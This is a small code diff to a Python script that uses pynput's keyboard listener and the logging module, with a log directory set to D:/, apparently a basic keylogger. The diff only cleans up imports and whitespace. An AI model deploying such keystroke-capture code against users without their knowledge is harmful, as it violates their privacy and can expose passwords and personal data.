@@ -5,8 +5,7 @@ Created on Thu Oct  3 13:30:46 2019
 @author: inkuml05
 """
 
-import pynput
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 import logging
 
 log_dir =r'D:/'
@@ -17,4 +16,4 @@ def on_press(key):
 
 with Listener(on_press = on_press) as listner:
     listner.join()
-
+    
